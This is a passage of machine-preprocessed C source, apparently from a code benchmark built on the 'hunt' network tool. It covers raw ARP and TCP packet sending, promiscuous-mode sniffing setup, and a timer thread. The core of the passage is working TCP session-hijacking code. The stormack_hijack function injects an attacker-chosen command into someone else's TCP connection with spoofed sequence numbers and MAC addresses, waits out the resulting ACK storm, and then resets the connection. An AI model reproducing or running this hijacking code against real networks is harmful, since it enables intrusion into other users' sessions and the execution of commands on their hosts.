  memcpy((void */* __restrict  */)(arpeth->ar_tha), (void const   */* __restrict  */)as->target_mac,
         (size_t )6);
#line 241
  tmp.val = as->target_addr;
#line 242
  i = 0;
  }
  {
#line 242
  while (1) {
    while_continue___0: /* CIL Label */ ;
#line 242
    if (! (i < 4)) {
#line 242
      goto while_break___0;
    }
#line 243
    arpeth->ar_tip[i] = (unsigned char )tmp.buff[i];
#line 242
    i ++;
  }
  while_break___0: /* CIL Label */ ;
  }
  {
#line 245
  memset((void *)(& spkt), 0, sizeof(spkt));
#line 246
  strncpy((char */* __restrict  */)(spkt.sa_data), (char const   */* __restrict  */)eth_device,
          sizeof(spkt.sa_data));
#line 248
  memset((void *)(& msg), 0, sizeof(msg));
#line 249
  msg.msg_name = (void *)(& spkt);
#line 250
  msg.msg_namelen = (socklen_t )sizeof(spkt);
#line 251
  msg.msg_iovlen = (size_t )1;
#line 252
  msg.msg_iov = & iov;
#line 253
  iov.iov_base = (void *)(buf);
#line 257
  data_len = (int )((sizeof(struct ethhdr ) + sizeof(struct arphdr )) + sizeof(struct arpeth_hdr ));
#line 258
  memset((void *)(buf + data_len), 0, (size_t )(60 - data_len));
#line 260
  iov.iov_len = (size_t )60;
#line 262
  retval = Sendmsg(linksock, (struct msghdr  const  *)(& msg), 0U);
  }
#line 263
  return (retval);
}
}
#line 266 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/net.c"
int send_packet(struct packet *p ) 
{ 
  int retval ;
  struct sockaddr spkt ;
  struct msghdr msg ;
  struct iovec iov ;

  {
  {
#line 273
  memset((void *)(& spkt), 0, sizeof(spkt));
#line 274
  strncpy((char */* __restrict  */)(spkt.sa_data), (char const   */* __restrict  */)eth_device,
          sizeof(spkt.sa_data));
#line 276
  memset((void *)(& msg), 0, sizeof(msg));
#line 277
  msg.msg_name = (void *)(& spkt);
#line 278
  msg.msg_namelen = (socklen_t )sizeof(spkt);
#line 279
  msg.msg_iovlen = (size_t )1;
#line 280
  msg.msg_iov = & iov;
#line 281
  iov.iov_base = (void *)(p->p_raw);
#line 282
  iov.iov_len = (size_t )p->p_raw_len;
#line 284
  retval = Sendmsg(linksock, (struct msghdr  const  *)(& msg), 0U);
  }
#line 285
  return (retval);
}
}
#line 78 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.h"
void *list_consume_rel(struct list *l , struct timespec  const  *relts ) ;
#line 149 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct list l_ifunc_fast_tcp ;
#line 487
int storm_reset_sec ;
#line 488
int stormack_hijack_wait_sec ;
#line 491
int stormack_hijack(struct conn_info *ci , char *cmdbuf ) ;
#line 493
void func_hijack_dst(struct packet *p , struct conn_info *arg ) ;
#line 494
void func_hijack_src(struct packet *p , struct conn_info *arg ) ;
#line 27 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hijack.c"
int user_stormack_hijack(struct user_conn_info *uci , char *cmdbuf ) 
{ 
  struct conn_info *ci ;
  int retval ;

  {
  {
#line 32
  ci = conn_get(uci);
  }
#line 32
  if (ci) {
    {
#line 36
    retval = stormack_hijack(ci, cmdbuf);
#line 37
    conn_free(ci);
    }
  } else {
    {
#line 33
    printf((char const   */* __restrict  */)"connection isn\'t available\n");
#line 34
    retval = 1;
    }
  }
#line 39
  return (retval);
}
}
#line 42 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hijack.c"
struct list l_hijack_conn  = 
#line 42
     {(void *)0, (void *)0, (int )((char *)(& ((struct packet *)0)->p_next[1]) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 44 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hijack.c"
void func_hijack_dst(struct packet *p , struct conn_info *arg ) 
{ 


  {
#line 46
  if ((unsigned long )(p->p_iph)->saddr == arg->dst_addr) {
#line 46
    if ((unsigned long )(p->p_iph)->daddr == arg->src_addr) {
#line 46
      if ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.source == (int )arg->dst_port) {
#line 46
        if ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.dest == (int )arg->src_port) {
          {
#line 50
          packet_want(p);
#line 51
          list_produce(& l_hijack_conn, (void *)p);
          }
        }
      }
    }
  }
#line 53
  return;
}
}
#line 55 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hijack.c"
void func_hijack_src(struct packet *p , struct conn_info *arg ) 
{ 


  {
#line 57
  if ((unsigned long )(p->p_iph)->saddr == arg->src_addr) {
#line 57
    if ((unsigned long )(p->p_iph)->daddr == arg->dst_addr) {
#line 57
      if ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.source == (int )arg->src_port) {
#line 57
        if ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.dest == (int )arg->dst_port) {
          {
#line 61
          packet_want(p);
#line 62
          list_produce(& l_hijack_conn, (void *)p);
          }
        }
      }
    }
  }
#line 64
  return;
}
}
#line 69 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hijack.c"
void fast_ack_to_dst(struct packet *p , struct conn_info *ci ) 
{ 
  struct iphdr *iph ;
  struct tcphdr *tcph ;
  struct tcp_spec ts ;
  uint16_t tmp ;
  uint16_t tmp___0 ;

  {
#line 75
  iph = p->p_iph;
#line 76
  tcph = p->p_hdr.p_tcph;
#line 78
  if ((unsigned long )iph->saddr == ci->dst_addr) {
#line 78
    if ((unsigned long )iph->daddr == ci->src_addr) {
#line 78
      if ((int )tcph->__annonCompField3.__annonCompField2.source == (int )ci->dst_port) {
#line 78
        if ((int )tcph->__annonCompField3.__annonCompField2.dest == (int )ci->src_port) {
#line 83
          if (p->p_data_len) {
            {
#line 84
            memset((void *)(& ts), 0, sizeof(ts));
#line 85
            ts.saddr = ci->src_addr;
#line 86
            ts.daddr = ci->dst_addr;
#line 87
            ts.sport = ci->src_port;
#line 88
            ts.dport = ci->dst_port;
#line 89
            ts.src_mac = (char *)(ci->src.src_mac);
#line 90
            ts.dst_mac = (char *)(ci->dst.src_mac);
#line 91
            ts.seq = ci->dst.next_d_seq;
#line 92
            ts.ack_seq = ci->dst.next_seq;
            }
#line 93
            if (ci->src.window) {
#line 93
              ts.window = ci->src.window;
            } else {
              {
#line 93
              tmp = htons((uint16_t )242);
#line 93
              ts.window = tmp;
              }
            }
            {
#line 94
            tmp___0 = ntohs(ci->src.id);
#line 94
            ts.id = htons((uint16_t )((int )tmp___0 + 1));
#line 95
            ts.ack = 1;
#line 96
            ts.psh = 0;
#line 97
            ts.rst = 0;
#line 98
            ts.data = (char *)((void *)0);
#line 99
            ts.data_len = 0;
#line 100
            send_tcp_packet(& ts);
            }
          }
        }
      }
    }
  }
#line 103
  return;
}
}
#line 199 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hijack.c"
int storm_reset_sec  =    4;
#line 200 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hijack.c"
int stormack_hijack_wait_sec  =    2;
#line 202 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hijack.c"
int stormack_hijack(struct conn_info *ci , char *cmdbuf ) 
{ 
  struct iphdr *iph ;
  struct tcphdr *tcph ;
  struct tcp_spec ts ;
  struct timespec relts ;
  struct ifunc_item ifunc_dst ;
  struct ifunc_item ifunc_src ;
  struct ifunc_item ifunc_ack ;
  struct packet *p ;
  struct timeval reset_time ;
  struct timeval now ;
  unsigned int src_ack ;
  int src_ack_count ;
  int reset_it ;
  int count_dst ;
  int ack_storm_detect ;
  int cmdbuf_len ;
  size_t tmp ;
  uint16_t tmp___0 ;
  uint16_t tmp___1 ;
  int sec ;
  int usec ;
  int d_sec ;
  void *tmp___2 ;
  int tmp___3 ;

  {
  {
#line 211
  src_ack = 0U;
#line 212
  src_ack_count = -1;
#line 212
  reset_it = 0;
#line 213
  count_dst = 0;
#line 214
  ack_storm_detect = 30;
#line 217
  tmp = strlen((char const   *)cmdbuf);
#line 217
  cmdbuf_len = (int )tmp;
#line 218
  memset((void *)(& ts), 0, sizeof(ts));
#line 219
  ts.saddr = ci->src_addr;
#line 220
  ts.daddr = ci->dst_addr;
#line 221
  ts.sport = ci->src_port;
#line 222
  ts.dport = ci->dst_port;
#line 223
  ts.src_mac = (char *)(ci->dst.dst_mac);
#line 224
  ts.dst_mac = (char *)(ci->dst.src_mac);
#line 225
  ts.seq = ci->dst.next_d_seq;
#line 226
  ts.ack_seq = ci->dst.next_seq;
  }
#line 227
  if (ci->src.window) {
#line 227
    ts.window = ci->src.window;
  } else {
    {
#line 227
    tmp___0 = htons((uint16_t )242);
#line 227
    ts.window = tmp___0;
    }
  }
  {
#line 228
  tmp___1 = ntohs(ci->src.id);
#line 228
  ts.id = htons((uint16_t )((int )tmp___1 + 1));
#line 229
  ts.ack = 1;
#line 230
  ts.psh = 1;
#line 231
  ts.rst = 0;
#line 232
  ts.data = cmdbuf;
#line 233
  ts.data_len = cmdbuf_len;
#line 235
  list_produce_start(& l_hijack_conn);
#line 237
  ifunc_ack.func = (void (*)(struct packet * , void * ))(& fast_ack_to_dst);
#line 238
  ifunc_ack.arg = (void *)ci;
#line 239
  list_enqueue(& l_ifunc_fast_tcp, (void *)(& ifunc_ack));
#line 241
  ifunc_dst.func = (void (*)(struct packet * , void * ))(& func_hijack_dst);
#line 242
  ifunc_dst.arg = (void *)ci;
#line 243
  list_enqueue(& l_ifunc_tcp, (void *)(& ifunc_dst));
#line 244
  ifunc_src.func = (void (*)(struct packet * , void * ))(& func_hijack_src);
#line 245
  ifunc_src.arg = (void *)ci;
#line 246
  list_enqueue(& l_ifunc_tcp, (void *)(& ifunc_src));
#line 251
  send_tcp_packet(& ts);
#line 258
  relts.tv_sec = (__time_t )stormack_hijack_wait_sec;
#line 259
  relts.tv_nsec = (__syscall_slong_t )0;
  }
  {
#line 260
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 260
    tmp___2 = list_consume_rel(& l_hijack_conn, (struct timespec  const  *)(& relts));
#line 260
    p = (struct packet *)tmp___2;
    }
#line 260
    if (! p) {
#line 260
      goto while_break;
    }
#line 261
    iph = p->p_iph;
#line 262
    tcph = p->p_hdr.p_tcph;
#line 263
    if ((unsigned long )iph->saddr == ci->dst_addr) {
#line 263
      if ((unsigned long )iph->daddr == ci->src_addr) {
#line 263
        if ((int )tcph->__annonCompField3.__annonCompField2.source == (int )ci->dst_port) {
#line 263
          if ((int )tcph->__annonCompField3.__annonCompField2.dest == (int )ci->src_port) {
#line 268
            if (p->p_data_len) {
              {
#line 269
              count_dst ++;
#line 269
              print_data_packet(p, p->p_data_len, count_dst, 1);
              }
            }
            {
#line 270
            packet_free(p);
            }
          } else {
#line 263
            goto _L___1;
          }
        } else {
#line 263
          goto _L___1;
        }
      } else {
#line 263
        goto _L___1;
      }
    } else {
      _L___1: /* CIL Label */ 
#line 273
      if (src_ack != (unsigned int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.ack) {
#line 274
        src_ack = (unsigned int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.ack;
#line 275
        src_ack_count = 0;
      } else
#line 273
      if (src_ack_count < 0) {
#line 274
        src_ack = (unsigned int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.ack;
#line 275
        src_ack_count = 0;
      } else {
#line 276
        src_ack_count ++;
#line 276
        if (src_ack_count > ack_storm_detect) {
#line 277
          if (! reset_it) {
            {
#line 278
            set_tty_color((enum TTY_COLOR )9);
#line 279
            printf((char const   */* __restrict  */)"ACK storm detected - reset after %ds\n",
                   storm_reset_sec);
#line 280
            set_tty_color((enum TTY_COLOR )7);
#line 281
            reset_it = 1;
#line 282
            gettimeofday((struct timeval */* __restrict  */)(& reset_time), (__timezone_ptr_t )((void *)0));
            }
          } else {
            {
#line 284
            set_tty_color((enum TTY_COLOR )9);
#line 285
            printf((char const   */* __restrict  */)".");
#line 286
            set_tty_color((enum TTY_COLOR )7);
#line 287
            fflush(stdout);
            }
          }
#line 289
          ack_storm_detect += 300;
        }
      }
      {
#line 291
      packet_free(p);
      }
    }
#line 293
    if (reset_it) {
      {
#line 296
      gettimeofday((struct timeval */* __restrict  */)(& now), (__timezone_ptr_t )((void *)0));
#line 297
      sec = (int )(now.tv_sec - reset_time.tv_sec);
#line 298
      usec = (int )(now.tv_usec - reset_time.tv_usec);
      }
#line 299
      if (usec < 0) {
#line 300
        usec += 1000000;
#line 301
        sec --;
      }
#line 303
      d_sec = usec / 100000 + sec * 10;
#line 304
      if (d_sec >= storm_reset_sec * 10) {
        {
#line 305
        rst(ci, 5, 2);
#line 306
        set_tty_color((enum TTY_COLOR )9);
#line 307
        printf((char const   */* __restrict  */)"\n\nreset done\n\n");
#line 308
        set_tty_color((enum TTY_COLOR )7);
        }
#line 309
        goto while_break;
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 313
  list_remove(& l_ifunc_fast_tcp, (void *)(& ifunc_ack));
#line 314
  list_remove(& l_ifunc_tcp, (void *)(& ifunc_dst));
#line 315
  list_remove(& l_ifunc_tcp, (void *)(& ifunc_src));
#line 316
  packet_flush(& l_hijack_conn);
  }
#line 317
  if (reset_it) {
#line 317
    tmp___3 = 1;
  } else {
#line 317
    tmp___3 = 0;
  }
#line 317
  return (tmp___3);
}
}
#line 988 "/usr/include/pthread.h"
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1))) pthread_cond_signal)(pthread_cond_t *__cond ) ;
#line 1011
extern int ( __attribute__((__nonnull__(1,2,3))) pthread_cond_timedwait)(pthread_cond_t * __restrict  __cond ,
                                                                         pthread_mutex_t * __restrict  __mutex ,
                                                                         struct timespec  const  * __restrict  __abstime ) ;
#line 79 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.h"
void *list_peek(struct list *l ) ;
#line 642 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
void register_timejob(struct timejob *tj ) ;
#line 13 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/timer.c"
struct list timejob_list  = 
#line 13 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/timer.c"
     {(void *)0, (void *)0, (int )((char *)(& ((struct timejob *)0)->j_next) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 15 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/timer.c"
pthread_t timejob_thr  ;
#line 17 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/timer.c"
pthread_mutex_t timejob_mutex  =    {{0, 0U, 0, 0U, 0, (short)0, (short)0, {(struct __pthread_internal_list *)0, (struct __pthread_internal_list *)0}}};
#line 18 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/timer.c"
pthread_cond_t timejob_cond  =    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}};
#line 19 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/timer.c"
pthread_cond_t timejob_curr_cond  =    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}};
#line 20 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/timer.c"
pthread_cond_t timejob_run_cond  =    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}};
#line 22 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/timer.c"
struct timejob *timejob_curr  =    (struct timejob *)((void *)0);
#line 23 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/timer.c"
int timejob_run  =    1;
#line 25 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/timer.c"
static int __register(struct timejob *tj ) 
{ 
  struct list_iterator li ;
  int i ;
  int retval ;
  int insert_it ;
  struct timejob *p ;
  void *tmp ;
  int tmp___0 ;

  {
  {
#line 32
  retval = 0;
#line 33
  insert_it = 0;
#line 34
  i = 0;
#line 35
  list_iter_set(& li, & timejob_list);
  }
  {
#line 36
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 36
    tmp = list_iter_get(& li);
#line 36
    p = (struct timejob *)tmp;
    }
#line 36
    if (! p) {
#line 36
      goto while_break;
    }
#line 37
    if (p->j_ts.tv_sec > tj->j_ts.tv_sec) {
#line 39
      insert_it = 1;
#line 40
      goto while_break;
    } else
#line 37
    if (p->j_ts.tv_sec == tj->j_ts.tv_sec) {
#line 37
      if (p->j_ts.tv_nsec > tj->j_ts.tv_nsec) {
#line 39
        insert_it = 1;
#line 40
        goto while_break;
      }
    }
#line 42
    i ++;
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 44
  list_iter_end(& li);
  }
#line 45
  if (insert_it) {
    {
#line 46
    list_insert_at(& timejob_list, i, (void *)tj);
    }
#line 47
    if (i == 0) {
#line 48
      retval = 1;
    }
  } else {
    {
#line 50
    list_enqueue(& timejob_list, (void *)tj);
#line 51
    tmp___0 = list_count(& timejob_list);
    }
#line 51
    if (tmp___0 == 1) {
#line 52
      retval = 1;
    }
  }
#line 62
  return (retval);
}
}
#line 65 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/timer.c"
void register_timejob(struct timejob *tj ) 
{ 
  int tmp ;

  {
  {
#line 67
  pthread_mutex_lock(& timejob_mutex);
#line 68
  tmp = __register(tj);
  }
#line 68
  if (tmp) {
    {
#line 69
    pthread_cond_signal(& timejob_cond);
    }
  }
  {
#line 70
  pthread_mutex_unlock(& timejob_mutex);
  }
#line 71
  return;
}
}
#line 73 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/timer.c"
void register_timejob_rel(struct timejob *tj , int relsec ) 
{ 
  struct timeval tv ;

  {
  {
#line 77
  gettimeofday((struct timeval */* __restrict  */)(& tv), (__timezone_ptr_t )((void *)0));
#line 78
  tj->j_ts.tv_sec = tv.tv_sec + (__time_t )relsec;
#line 79
  tj->j_ts.tv_nsec = tv.tv_usec * 1000L;
#line 80
  register_timejob(tj);
  }
#line 81
  return;
}
}
#line 83 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/timer.c"
void register_timejob_milsec_rel(struct timejob *tj , int milsec ) 
{ 
  struct timeval tv ;
  int sec ;
  int msec ;

  {
  {
#line 88
  gettimeofday((struct timeval */* __restrict  */)(& tv), (__timezone_ptr_t )((void *)0));
#line 89
  sec = milsec / 1000;
#line 90
  msec = milsec % 1000;
#line 91
  tj->j_ts.tv_sec = tv.tv_sec + (__time_t )sec;
#line 92
  tj->j_ts.tv_nsec = tv.tv_usec * 1000L + (__suseconds_t )(msec * 1000000);
#line 93
  register_timejob(tj);
  }
#line 94
  return;
}
}
#line 96 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/timer.c"
void unregister_timejob(struct timejob *tj ) 
{ 


  {
  {
#line 98
  pthread_mutex_lock(& timejob_mutex);
  }
  {
#line 99
  while (1) {
    while_continue: /* CIL Label */ ;
#line 99
    if (! ((unsigned long )timejob_curr == (unsigned long )tj)) {
#line 99
      goto while_break;
    }
    {
#line 100
    pthread_cond_wait((pthread_cond_t */* __restrict  */)(& timejob_curr_cond), (pthread_mutex_t */* __restrict  */)(& timejob_mutex));
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 101
  list_remove(& timejob_list, (void *)tj);
#line 102
  pthread_cond_signal(& timejob_cond);
#line 103
  pthread_mutex_unlock(& timejob_mutex);
  }
#line 104
  return;
}
}
#line 107 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/timer.c"
static void *timejob_thread(void *arg ) 
{ 
  struct timejob *tj ;
  struct timeval tv ;
  struct timespec timeout ;
  int sec ;
  __pid_t tmp ;
  void *tmp___0 ;
  int tmp___1 ;

  {
  {
#line 114
  tmp = getpid();
#line 114
  setpriority(0, (id_t )tmp, 10);
#line 115
  pthread_mutex_lock(& timejob_mutex);
  }
  {
#line 116
  while (1) {
    while_continue: /* CIL Label */ ;
#line 116
    if (timejob_run) {
      {
#line 116
      tmp___1 = pthread_kill(main_thread_id, 0);
      }
#line 116
      if (! (tmp___1 == 0)) {
#line 116
        goto while_break;
      }
    } else {
#line 116
      goto while_break;
    }
    {
#line 117
    tmp___0 = list_peek(& timejob_list);
#line 117
    tj = (struct timejob *)tmp___0;
    }
#line 118
    if (tj) {
      {
#line 119
      gettimeofday((struct timeval */* __restrict  */)(& tv), (__timezone_ptr_t )((void *)0));
      }
#line 120
      if (tv.tv_sec > tj->j_ts.tv_sec) {
#line 120
        goto _L;
      } else
#line 120
      if (tv.tv_sec == tj->j_ts.tv_sec) {
#line 120
        if (tv.tv_usec * 1000L >= tj->j_ts.tv_nsec) {
          _L: /* CIL Label */ 
          {
#line 122
          timejob_curr = tj;
#line 123
          list_pop(& timejob_list);
#line 124
          pthread_mutex_unlock(& timejob_mutex);
#line 125
          sec = (*(timejob_curr->j_func))(timejob_curr->j_arg, timejob_curr->j_arg_sec);
#line 127
          pthread_mutex_lock(& timejob_mutex);
          }
#line 128
          if (sec) {
            {
#line 129
            gettimeofday((struct timeval */* __restrict  */)(& tv), (__timezone_ptr_t )((void *)0));
#line 130
            tj->j_ts.tv_sec = tv.tv_sec + (__time_t )sec;
#line 131
            tj->j_ts.tv_nsec = tv.tv_usec * 1000L;
#line 132
            __register(tj);
            }
          }
          {
#line 134
          timejob_curr = (struct timejob *)((void *)0);
#line 135
          pthread_cond_signal(& timejob_curr_cond);
          }
        } else {
          {
#line 138
          timeout = tj->j_ts;
#line 139
          pthread_cond_timedwait((pthread_cond_t */* __restrict  */)(& timejob_cond),
                                 (pthread_mutex_t */* __restrict  */)(& timejob_mutex),
                                 (struct timespec  const  */* __restrict  */)(& timeout));
          }
        }
      } else {
        {
#line 138
        timeout = tj->j_ts;
#line 139
        pthread_cond_timedwait((pthread_cond_t */* __restrict  */)(& timejob_cond),
                               (pthread_mutex_t */* __restrict  */)(& timejob_mutex),
                               (struct timespec  const  */* __restrict  */)(& timeout));
        }
      }
    } else {
      {
#line 142
      pthread_cond_wait((pthread_cond_t */* __restrict  */)(& timejob_cond), (pthread_mutex_t */* __restrict  */)(& timejob_mutex));
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 145
  timejob_run = 2;
#line 146
  pthread_cond_signal(& timejob_run_cond);
#line 147
  pthread_mutex_unlock(& timejob_mutex);
  }
#line 148
  return ((void *)0);
}
}
#line 151 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/timer.c"
void timer_init(void) 
{ 
  int tmp ;

  {
  {
#line 153
  tmp = pthread_create((pthread_t */* __restrict  */)(& timejob_thr), (pthread_attr_t const   */* __restrict  */)((void *)0),
                       & timejob_thread, (void */* __restrict  */)((void *)0));
  }
#line 153
  if (tmp) {
    {
#line 154
    exit(1);
    }
  }
#line 155
  return;
}
}
#line 157 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/timer.c"
void timer_done(void) 
{ 
  int tmp ;

  {
  {
#line 159
  pthread_mutex_lock(& timejob_mutex);
#line 160
  timejob_run = 0;
#line 161
  pthread_cond_signal(& timejob_cond);
  }
  {
#line 162
  while (1) {
    while_continue: /* CIL Label */ ;
#line 162
    if (timejob_run != 2) {
      {
#line 162
      tmp = pthread_kill(timejob_thr, 0);
      }
#line 162
      if (! (tmp == 0)) {
#line 162
        goto while_break;
      }
    } else {
#line 162
      goto while_break;
    }
    {
#line 163
    pthread_cond_wait((pthread_cond_t */* __restrict  */)(& timejob_run_cond), (pthread_mutex_t */* __restrict  */)(& timejob_mutex));
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 164
  pthread_mutex_unlock(& timejob_mutex);
  }
#line 165
  return;
}
}
#line 846 "/usr/include/stdio.h"
extern void perror(char const   *__s ) ;
#line 61 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
unsigned char my_eth_mac[6]  ;
#line 62 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
unsigned int my_eth_ip  ;
#line 421
int print_eth_mac(unsigned char *mac ) ;
#line 425
int get_ifc_info(char *ifc_name , unsigned int *ip , char *mac ) ;
#line 39 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/tap.c"
int tap(char *device , int promisc_mode ) 
{ 
  int fd ;
  struct ifreq ifr ;
  uint16_t tmp ;
  int tmp___0 ;
  int tmp___1 ;
  int tmp___2 ;
  int tmp___3 ;
  char *tmp___4 ;

  {
  {
#line 52
  tmp = htons((uint16_t )3);
#line 52
  fd = socket(2, 10, (int )tmp);
  }
#line 52
  if (fd < 0) {
#line 54
    if (verbose) {
      {
#line 55
      perror("(tap) SOCK_PACKET allocation problems [fatal]");
      }
    }
    {
#line 56
    exit(1);
    }
  }
  {
#line 58
  strncpy((char */* __restrict  */)(ifr.ifr_ifrn.ifrn_name), (char const   */* __restrict  */)device,
          (size_t )16);
#line 59
  ifr.ifr_ifrn.ifrn_name[15] = (char)0;
#line 60
  tmp___0 = ioctl(fd, 35091UL, & ifr);
  }
#line 60
  if (tmp___0 < 0) {
#line 61
    if (verbose) {
      {
#line 62
      perror("(tap) Can\'t get device flags [fatal]");
      }
    }
    {
#line 63
    close(fd);
#line 64
    exit(1);
    }
  }
#line 66
  if (! promisc_mode) {
#line 67
    ifr.ifr_ifru.ifru_flags = (short )((int )ifr.ifr_ifru.ifru_flags & -257);
  } else {
#line 69
    ifr.ifr_ifru.ifru_flags = (short )((int )ifr.ifr_ifru.ifru_flags | 256);
  }
  {
#line 76
  tmp___1 = ioctl(fd, 35092UL, & ifr);
  }
#line 76
  if (tmp___1 < 0) {
#line 77
    if (verbose) {
      {
#line 78
      perror("(tap) Can\'t set/unset promiscuous mode [fatal]");
      }
    }
    {
#line 79
    close(fd);
#line 80
    exit(1);
    }
  }
#line 82
  if (! promisc_mode) {
    {
#line 83
    close(fd);
    }
#line 84
    return (0);
  } else {
    {
#line 86
    tmp___2 = ioctl(fd, 35093UL, & ifr);
    }
#line 86
    if (tmp___2 < 0) {
#line 87
      if (verbose) {
        {
#line 88
        perror("(tap) Can\'t get interface IP address");
        }
      }
      {
#line 89
      tap(device, 0);
#line 90
      exit(1);
      }
    }
    {
#line 92
    my_eth_ip = *((unsigned int *)(ifr.ifr_ifru.ifru_addr.sa_data + 2));
#line 93
    tmp___3 = ioctl(fd, 35111UL, & ifr);
    }
#line 93
    if (tmp___3 < 0) {
#line 94
      if (verbose) {
        {
#line 95
        perror("(tap) Can\'t get interface HW address");
        }
      }
      {
#line 96
      tap(device, 0);
#line 97
      exit(1);
      }
    }
    {
#line 99
    memcpy((void */* __restrict  */)(my_eth_mac), (void const   */* __restrict  */)(ifr.ifr_ifru.ifru_hwaddr.sa_data),
           (size_t )6);
    }
#line 100
    if (verbose) {
      {
#line 101
      tmp___4 = host_lookup(my_eth_ip, 0);
#line 101
      printf((char const   */* __restrict  */)"listeining on %s %s ", device, tmp___4);
#line 103
      print_eth_mac(my_eth_mac);
#line 104
      printf((char const   */* __restrict  */)"\n");
      }
    }
#line 106
    return (fd);
  }
}
}
#line 110 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/tap.c"
int get_ifc_info(char *ifc_name , unsigned int *ip , char *mac ) 
{ 
  int fd ;
  struct ifreq ifr ;
  uint16_t tmp ;
  int tmp___0 ;
  int tmp___1 ;

  {
  {
#line 115
  tmp = htons((uint16_t )3);
#line 115
  fd = socket(2, 3, (int )tmp);
  }
#line 115
  if (fd < 0) {
#line 116
    return (-1);
  }
  {
#line 118
  strncpy((char */* __restrict  */)(ifr.ifr_ifrn.ifrn_name), (char const   */* __restrict  */)ifc_name,
          (size_t )16);
#line 119
  ifr.ifr_ifrn.ifrn_name[15] = (char)0;
  }
#line 121
  if (ip) {
    {
#line 122
    tmp___0 = ioctl(fd, 35093UL, & ifr);
    }
#line 122
    if (tmp___0 < 0) {
      {
#line 123
      close(fd);
      }
#line 124
      return (-1);
    }
#line 126
    *ip = *((unsigned int *)(ifr.ifr_ifru.ifru_addr.sa_data + 2));
  }
#line 128
  if (mac) {
    {
#line 129
    tmp___1 = ioctl(fd, 35111UL, & ifr);
    }
#line 129
    if (tmp___1 < 0) {
      {
#line 130
      close(fd);
      }
#line 131
      return (-1);
    }
    {
#line 133
    memcpy((void */* __restrict  */)mac, (void const   */* __restrict  */)(ifr.ifr_ifru.ifru_hwaddr.sa_data),
           (size_t )6);
#line 134
    printf((char const   */* __restrict  */)"mac on %s ", ifc_name);
#line 135
    print_eth_mac((unsigned char *)mac);
#line 136
    printf((char const   */* __restrict  */)"\n");
    }
  }
  {
#line 138
  close(fd);
  }
#line 139
  return (0);
}
}
#line 226 "/usr/include/x86_64-linux-gnu/sys/socket.h"
extern  __attribute__((__nothrow__)) int ( __attribute__((__leaf__)) setsockopt)(int __fd ,
                                                                                 int __level ,
                                                                                 int __optname ,
                                                                                 void const   *__optval ,
                                                                                 socklen_t __optlen ) ;
#line 407 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
void set_tty_color_bg(enum TTY_COLOR fg , enum TTY_COLOR bg ) ;
#line 409
int is_power2(unsigned int i ) ;
#line 410
int log2(unsigned int i ) ;
#line 417
void print_data(char *label , void *data , int len ) ;
#line 424
int rawsock(void) ;
#line 430
unsigned char __suggest_mac[6] ;
#line 435
int writen(int fd , char *ptr , int nbytes ) ;
#line 453
char *port_lookup(unsigned short serv , int use_mode ) ;
#line 606
int print_cntrl_chars ;
#line 538 "/usr/include/stdio.h"
extern int getchar(void) ;
#line 580
